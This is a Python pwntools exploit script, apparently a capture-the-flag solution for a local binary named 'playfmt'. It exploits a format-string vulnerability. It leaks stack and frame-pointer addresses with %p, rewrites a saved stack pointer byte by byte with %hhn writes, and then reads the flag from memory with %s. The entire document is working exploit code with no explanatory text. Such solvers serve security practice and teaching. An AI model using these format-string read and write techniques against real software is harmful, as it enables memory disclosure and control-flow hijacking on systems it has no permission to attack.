from pwn import *
from LibcSearcher import LibcSearcher
context.log_level = "debug"
do_fmt_ebp_offset = 6
play_ebp_offset = 14
main_ebp_offset = 26

def format_offset(format_str , offset):
	return format_str.replace("{}" , str(offset))

def get_target_offset_value(offset , name):
	payload = format_offset("%{}$p\x00" , offset)
	p.sendline(payload)
	text = p.recv()
	try:
		value = int(text.split("\n")[0] , 16)
	  	print(name + " : " + hex(value))
		return value
	except Exception, e:
		print text

def modify_last_byte(last_byte , offset):
	payload = "%" + str(last_byte) + "c" + format_offset("%{}$hhn" , offset)
	p.sendline(payload)
	p.recv()

def modify(addr , value , ebp_offset , ebp_1_offset):
	addr_last_byte = addr & 0xff
	for i in range(4):
		now_value = (value >> i * 8) & 0xff
		modify_last_byte(addr_last_byte + i ,  ebp_offset)
		modify_last_byte(now_value , ebp_1_offset)

p = process("./playfmt")
elf = ELF("./playfmt")

p.recvuntil("=\n")
p.recvuntil("=\n")
# leak ebp_1_addr then get ebp_addr
play_ebp_addr = get_target_offset_value(do_fmt_ebp_offset,  "logo_ebp") 
# get_ebp_addr
main_ebp_addr = get_target_offset_value(do_fmt_ebp_offset,  "main_ebp")
# flag_class_ptr_addr = main_ebp_addr + 0x10
# flag_class_ptr_offset = main_ebp_offset - 4
flag_class_ptr_offset = 19
flag_addr = get_target_offset_value(flag_class_ptr_offset , "flag_addr") - 0x420
log.info(hex(flag_addr))

# puts_plt = elf.plt["puts"]
modify(main_ebp_addr + 4 , flag_addr , do_fmt_ebp_offset , play_ebp_offset)
# gdb.attach(p)
payload = format_offset("%{}$s\x00" , play_ebp_offset + 1)
p.send(payload)
# log.info("flag_addr : " + hex(flag_addr))

# p.sendline("quit")
p.interactive()